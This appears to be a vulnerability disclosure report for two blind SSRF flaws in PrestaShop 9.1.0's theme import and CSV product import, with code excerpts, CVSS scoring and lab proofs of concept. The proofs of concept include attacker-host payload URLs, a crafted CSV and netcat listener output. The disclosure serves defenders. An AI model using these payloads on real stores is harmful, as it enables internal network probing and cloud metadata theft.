# [Security] Blind SSRF in PrestaShop 9.1.0 (Theme Import & CSV Import)

## Summary

During a security assessment of PrestaShop 9.1.0, two Blind Server-Side Request Forgery (SSRF) vulnerabilities were identified in the administrative interface. Both vulnerabilities have been validated with working Proof of Concept exploits in a controlled lab environment.

---

## Executive Summary

Two distinct SSRF attack vectors allow an authenticated administrator to coerce the PrestaShop server into issuing arbitrary outbound HTTP requests.

These vulnerabilities can be leveraged for:

* Internal network reconnaissance
* Cloud metadata enumeration
* Pivoting to backend services not exposed to the internet

| ID      | Vulnerability                     | Attack Surface                            | CVSS 3.1     |
| ------- | --------------------------------- | ----------------------------------------- | ------------ |
| VUL-001 | Blind SSRF via Theme Import       | `/admin-dev/improve/design/themes/import` | 5.5 (Medium) |
| VUL-002 | Blind SSRF via CSV Product Import | `/admin-dev/?controller=AdminImport`      | 5.5 (Medium) |

---

## Root Cause

The utility functions:

* `Tools::createFileFromUrl()`
* `Tools::file_get_contents()`

perform outbound HTTP requests against user-supplied URLs **without validating destination IP/hostname**, allowing access to:

* RFC1918 private address space
* Loopback interfaces
* Link-local addresses (e.g., cloud metadata endpoints)

---

## Test Environment

| Role                | IP Address      | Platform         | Configuration                       |
| ------------------- | --------------- | ---------------- | ----------------------------------- |
| Target (PrestaShop) | 192.168.106.128 | Ubuntu 24.04 LTS | PrestaShop 9.1.0, Apache, port 8001 |
| Attacker            | 192.168.106.141 | Kali Linux 2024  | Netcat listener                     |

---

# VUL-001: Blind SSRF via Theme Import

## Vulnerability Details

* **Classification:** CWE-918: Server-Side Request Forgery
* **CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:L — 5.5 (Medium)

---

## Technical Analysis

```php
// classes/Tools.php:1920-1947
public static function createFileFromUrl($url)
{
    $scheme = parse_url($url, PHP_URL_SCHEME);
    if (!in_array(strtolower($scheme), ['http', 'https'], true)) {
        return false;
    }

    // No destination validation — SSRF sink
    $remoteFile = fopen($url, 'rb');
}
```

---

## Proof of Concept

### Step 1 — Start listener

```bash
nc -nvlp 1337
```

### Step 2 — Authenticate to PrestaShop Back Office

### Step 3 — Navigate

Design → Theme & Logo → Add new theme

---

### Step 4 — Payload

```text
http://192.168.106.141:1337/image.zip
```
<img width="1323" height="848" alt="image" src="https://github.com/user-attachments/assets/df30f8ba-1d63-4917-a756-d667e89cdaad" />

---

### Step 5 — Trigger

Click **Save**

---

## Observed Result

```bash
root@kali:~/Desktop# nc -nvlp 1337
listening on [any] 1337 ...
connect to [192.168.106.141] from (UNKNOWN) [192.168.106.128] 51048
GET /image.zip HTTP/1.1
Host: 192.168.106.141:1337
Connection: close
```
<img width="1253" height="630" alt="image" src="https://github.com/user-attachments/assets/80c3274b-a4dc-4654-9af7-de5628b64b1e" />

The server at `192.168.106.128` initiated an outbound HTTP request to the attacker-controlled endpoint. **This confirms the SSRF vulnerability.**

---

# VUL-002: Blind SSRF via CSV Product Import

## Vulnerability Details

* **Classification:** CWE-918: Server-Side Request Forgery
* **CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:L — 5.5 (Medium)

---

## Technical Analysis

```php
// controllers/admin/AdminImportController.php:1835
Tools::copy($info['file_url'], _PS_DOWNLOAD_DIR_ . $product_download->filename);
```

```php
// classes/Tools.php:1802-1809
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_MAXREDIRS, 5);
```

---

## Proof of Concept

### Step 1 — Start listener

```bash
nc -nvlp 1338
```

---

### Step 2 — Malicious CSV

```csv
id;name;is_virtual;file_url;nb_downloadable;nb_days_accessible
1;SSRF Virtual Product;1;http://192.168.106.141:1338/ssrf-file-poc;100;365
```

> Note: `is_virtual` must be set to 1.

---

### Step 3 — Authenticate to Back Office

---

### Step 4 — Navigate

Configure → Advanced Parameters → Import
<img width="1850" height="767" alt="image" src="https://github.com/user-attachments/assets/863431e1-822f-4922-989c-ee3a91f7606f" />

---

### Step 5 — Configure Import

* Entity type: Products
* Upload: `ssrf_file.csv`
* Field separator: `;`
* Click **Next step**
<img width="1897" height="838" alt="image" src="https://github.com/user-attachments/assets/9cb16b25-bec4-4da0-8a21-580ce00b4261" />

---

### Step 6 — Map Fields

| CSV Column         | Mapped Field        |
| ------------------ | ------------------- |
| id                 | ID                  |
| name               | Name                |
| is_virtual         | Virtual product     |
| file_url           | File URL            |
| nb_downloadable    | Number of downloads |
| nb_days_accessible | Number of days      |
<img width="1915" height="848" alt="image" src="https://github.com/user-attachments/assets/4f12b522-4d8a-4833-a8c1-e5c7d0776f7a" />

---

### Step 7 — Trigger

Click **Import**

---

## Observed Result

```bash
root@kali:~/Desktop# nc -nvlp 1338
listening on [any] 1338 ...
connect to [192.168.106.141] from (UNKNOWN) [192.168.106.128] 41234
GET /ssrf-file-poc HTTP/1.1
Host: 192.168.106.141:1338
Accept: */*
```
<img width="1914" height="947" alt="image" src="https://github.com/user-attachments/assets/09c10a6e-d638-4ad5-889b-753bfb0342a3" />

---

## Impact

* Internal network scanning
* Access to internal services
* Cloud metadata exposure
* Information disclosure

---

## Attack Requirements

* Authenticated administrator access

---

## CWE Classification

* CWE-918: Server-Side Request Forgery (SSRF)

---

## CVSS 3.1

```
AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:L
Score: 5.5 (Medium)
```

---

## Discoverer

neitsploit1707

---

## References

* https://github.com/xuantien177
* https://github.com/PrestaShop/prestaShop/
